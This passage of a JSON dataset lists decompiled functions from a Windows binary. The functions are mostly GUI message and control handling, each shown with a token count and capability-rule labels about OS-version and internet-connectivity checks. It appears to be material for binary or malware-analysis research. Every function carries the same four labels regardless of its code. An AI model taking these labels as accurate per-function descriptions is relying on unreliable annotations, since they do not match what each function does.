        "decompiled_code": "\nuint64_t __fastcall fcn.00450d4c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xb2) != 0) {\n        (**(in_EAX + 0xb0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 113
    },
    "00450e18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450e18(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00450ea8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450ea8(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00450fb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00450fb0(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "00451058": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451058(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.0043b1a8(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.0044f860(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x451131\n                switch(*param_2) {\n                case 0x200:\n                    fcn.00446708();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.0040483c();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x497c54 + 0x20) != '\\0') && (*(*0x497c54 + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x497c54 + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.0043b0a8();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.0040483c();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x451324 == (*0x451320 & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.0045c9c8(),  cVar3 == '\\0')) {\n                        fcn.0045c954();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x497c54 + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004047cc();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.0043b1a8();\n                                    if (*NULL != NULL) {\n                                        fcn.00457a28();\n                                        var_15h._0_1_ = (**(**(*0x497c54 + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.00457a28();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.00457a28();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x497c54 + 0x28) != 0) {\n                                fcn.0045ca94();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.00446860();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.0043b1a8();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1126
    },
    "00451404": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451404(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x451614 == (*(*(arg_8h + -8) + 0x61) & *0x451610))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x451614 == (*(*(arg_8h + -8) + 0x61) & *0x451618))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x45161c == (*(*(arg_8h + -8) + 0x61) & *0x45161c))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x451620 == (*(*(arg_8h + -8) + 0x61) & *0x451620))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 889
    },
    "00451840": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00451840(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "004519c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004519c0(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.00450de8();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.00450d7c(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.00450de8(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 240
    },
    "00451b0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00451b0c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00451bb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00451bb8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00451ec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451ec4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x5a) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            fcn.00451e8c(&stack0xfffffffc);\n        }\n        else {\n            fcn.00451e8c(&stack0xfffffffc);\n        }\n        *(in_EAX + 0x5a) = 1;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00451f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451f94(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00452020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452020(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.0044fdb8();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "004521dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004521dc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.004520cc();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.00457a28();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.00452150(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "0045223c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00452283)\n\nvoid __fastcall fcn.0045223c(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45232c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.0044fcc4();\n        }\n        fcn.0044fcf4();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.004054c0();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.0044fbe4();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x452333;\n    uStack32 = 0x45232b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 437
    },
    "00452668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452668(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack64;\n    uint uStack60;\n    int16_t iStack55;\n    int16_t iStack53;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            iStack55 = *(param_2 + 8);\n            iStack53 = *(param_2 + 8) >> 0x10;\n            cVar1 = fcn.004183d8(iStack55, iStack53);\n            if (cVar1 == '\\0') {\n                fcn.0044f804();\n                (**(*in_EAX + 0x44))(uStack64, uStack60);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.0040483c();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.0040483c();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.0044f830();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.004183d8();\n                if (cVar1 != '\\0') {\n                    fcn.00418360();\n                    fcn.0044f754();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "00452aa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452aa8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404a0c();\n    fcn.0041faec();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.0044d5d0();\n    }\n    fcn.004070f8();\n    fcn.00404640();\n    if (piVar1[0xc] != 0) {\n        fcn.00453894();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.00453b18();\n    while (iVar2 != 0) {\n        piVar3 = fcn.00453adc();\n        fcn.00453900();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00453b18();\n    }\n    fcn.00404640();\n    if (piVar1[0x70] != 0) {\n        fcn.00420990();\n    }\n    fcn.00404640();\n    fcn.0044ec24();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "00452b88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452b88(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x452baf;\n    fcn.00404610();\n    uStack32 = 0x452c4c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.00419978();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.004197d8();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.004198cc();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.004197d8();\n            if (iVar2 != 0) {\n                fcn.00457c68();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x452c53;\n    uStack32 = 0x452c4b;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 423
    },
    "004532bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004532bc(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.00419680();\n    }\n    var_8h = fcn.00453b18();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.00453adc();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x453444 == (*0x453444 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004047cc(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004197d8();\n                    cVar1 = fcn.00453144(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419854();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.004197d8();\n            fcn.00453274(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 685
    },
    "00453448": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00453448(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00453b18();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00453adc();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.00453adc();\n            if (*0x453498 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "0045349c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045349c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x4534e6;\n    cVar1 = fcn.00453448(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00404610();\n        uStack32 = 0x45357b;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.004532bc(&stack0xfffffffc);\n        fcn.0040483c();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x45357a;\n        fcn.00404640();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 408
    },
    "004535a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004535a0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x4535b4;\n    cVar1 = fcn.00457d34();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x4535e0;\n            fcn.00453634();\n            uStack36 = 0x453627;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x45362e;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x453626;\n            fcn.0045363c();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "0045363c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045363c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.0045365c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00453b38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
